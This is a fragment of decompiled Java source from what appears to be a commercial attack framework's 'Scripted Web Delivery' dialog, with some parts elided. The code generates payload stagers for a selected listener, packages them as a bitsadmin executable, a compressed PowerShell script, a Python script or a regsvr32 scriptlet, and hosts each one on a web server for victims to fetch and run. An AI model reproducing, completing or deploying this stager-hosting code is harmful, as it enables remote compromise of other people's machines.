...
public class ScriptedWebDialog implements DialogListener, Callback {
   ...
   public void dialogAction(ActionEvent var1, Map var2) {
      ...
      ScListener var10 = ListenerUtils.getListener(this.client, var9);
      if (var10 == null) {
         this.dialog.setVisible(true);
         DialogUtils.showError("A listener was not selected");
      } else {
         byte[] var11 = var10.getPayloadStager("x86");
         byte[] var12;
         if ("bitsadmin".equals(var6)) {
            var12 = (new ArtifactUtils(this.client)).patchArtifact(var11, "artifact32.exe");
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(var5, Integer.parseInt(var3), var7, var4, CommonUtils.bString(var12), "application/octet-stream", "Scripted Web Delivery (bitsadmin)"), this);
         } else if ("powershell".equals(var6)) {
            var12 = (new ResourceUtils(this.client)).buildPowerShell(var11);
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(var5, Integer.parseInt(var3), var7, var4, (new PowerShellUtils(this.client)).PowerShellCompress(var12), "text/plain", "Scripted Web Delivery (powershell)"), this);
         } else if ("python".equals(var6)) {
            var12 = var10.getPayloadStager("x64");
            byte[] var13 = (new ResourceUtils(this.client)).buildPython(var11, var12);
            ...
            var12 = (new ArtifactUtils(this.client)).buildSCT(var11);
            this.client.getConnection().call("cloudstrike.host_data", CommonUtils.args(var5, Integer.parseInt(var3), var7, var4, CommonUtils.bString(var12), "text/plain", "Scripted Web Delivery (regsvr32)"), this);
         } else {
